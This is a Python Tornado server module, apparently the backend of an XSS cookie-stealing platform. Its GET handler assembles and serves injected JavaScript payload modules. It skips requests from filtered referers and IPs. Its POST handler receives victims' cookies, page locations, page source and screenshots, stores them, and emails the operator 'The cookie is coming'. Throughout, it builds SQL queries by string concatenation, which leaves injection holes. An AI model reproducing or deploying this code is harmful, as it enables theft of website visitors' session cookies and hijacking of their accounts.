#!/usr/bin/env python
# -*- coding:utf-8 -*-


__author__ = 'r0ker'
import tornado.web
import json
import db
import time
from config import URL
from function import urlde, urlen, sendmail


class GetHandler(tornado.web.RequestHandler):
	def set_default_headers(self):
		self.set_header('Access-Control-Allow-Origin', '*')
		self.set_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
		self.set_header('Access-Control-Max-Age', 1000)
		self.set_header('Access-Control-Allow-Headers', '*')
		self.set_header('Content-type', 'application/x-javascript;charset=utf-8')

	def get(self, id, do):
		row = db.ct("project", "*", "id="+id)
		if row:
			urls = urlde(row['furl']).split(';')
			ip = urlde(row['fip']).split(';')
			rurl = 'Referer' in self.request.headers and self.request.headers['Referer'] or '!@#$^&*123Rtiny'
			rip = self.request.headers['Remote-Ip'] 
			urlstatus = True
			for url in urls:
				if url.find(rurl) > 0:
					urlstatus = False
			if row['status'] == 1 and urlstatus and rip not in ip:
				code = urlde(row['custom'])
				s = json.loads(row['module'])
				for key in s:
					mcode = db.ct("module", "code", "id="+key)
					if mcode:
						mcode = urlde(mcode['code'])
					else:
						mcode = ''
					if s[key]:
						for x in urlde(s[key]).split(';'):
							if x:
								c = x.split('=')
								mcode = mcode.replace("{set."+c[0]+"}",c[1])
					code += mcode
				self.render('get.html', code=code, id=id, url=URL, m=do)
			else:
				self.set_header('Content-type', 'text/html;charset=utf-8')
				self.write('(⊙ˍ⊙)')
		else:
			self.set_header('Content-type', 'text/html')
			self.render('404.html')

	def post(self, id, do):
		def getname(id):
			return urlde(db.ct("project", "name", "id="+str(id))['name'])
		hostip = self.request.headers['Remote-Ip']
		information = self.get_argument('information', 'None')
		sourcecode = self.get_argument('code', 'None')
		screen = self.get_argument('screen', 'None')
		receive = self.get_argument('receive', 'None')
		if not information == 'None':
			addtime = int(time.time())
			request = self.request.headers
			headers = {
				'user-agent': urlen('user-agent' in request and request['user-agent'] or 'None'),
				'Accept-Language': urlen('Accept-Language' in request and request['Accept-Language'] or 'None'),
				'X-Forwarded-For': urlen('X-Forwarded-For' in request and request['X-Forwarded-For'] or 'None'),
				'Referer': urlen('Referer' in request and request['Referer'] or 'None'),
				}
			headers = json.dumps(headers)
			db.i(
				'host',
				'hostip,information,headers,projectid,addtime',
				"'"+hostip+"','"+urlen(information)+"','"+headers+"','"+id+"','"+str(addtime)+"'")
			hosts = json.loads(db.ct('project', "hosts", "id="+id)['hosts'])
			hosts.append(hostip)
			db.u("project", "hosts='"+json.dumps(list(set(hosts)))+"'", "id="+id)
			emails = urlde(db.ct("project", "email", "id=" + id)['email']).split(";")
			information = json.loads(information)
			print information
			for email in emails:
				text = 'location : ' + information['location'] + "<p>" +"cookie : " + information['cookie']
				sendmail(email,'The cookie is coming ['+hostip+']', '<h1>project: '+ getname(id) + "</h1><p>" + text)
		hostid = db.ct('host', 'id', "hostip='"+hostip+"' order by id desc limit 1")['id']
		if not sourcecode == 'None':
			db.u('host', "sourcecode='"+urlen(sourcecode)+"'", 'id='+str(hostid))
		if not screen == 'None':
			db.u('host', "screen='"+urlen(screen)+"'", 'id='+str(hostid))
		if not receive == 'None':
			oldreceive = urlde(db.ct(
				'host',
				'receive',
				'id='+str(hostid))['receive'] and db.ct('host', 'receive', 'id='+str(hostid))['receive'] or '')
			oldreceive = oldreceive and json.loads(oldreceive) or oldreceive
			if oldreceive:
				receive = json.loads(receive)
				for key in oldreceive:
					receive[key] = oldreceive[key]
				receive = json.dumps(receive)
			db.u('host', "receive='"+urlen(receive)+"'", 'id='+str(hostid))
		x=db.cts("host", "*", "projectid=5")
		self.write(json.dumps(x))
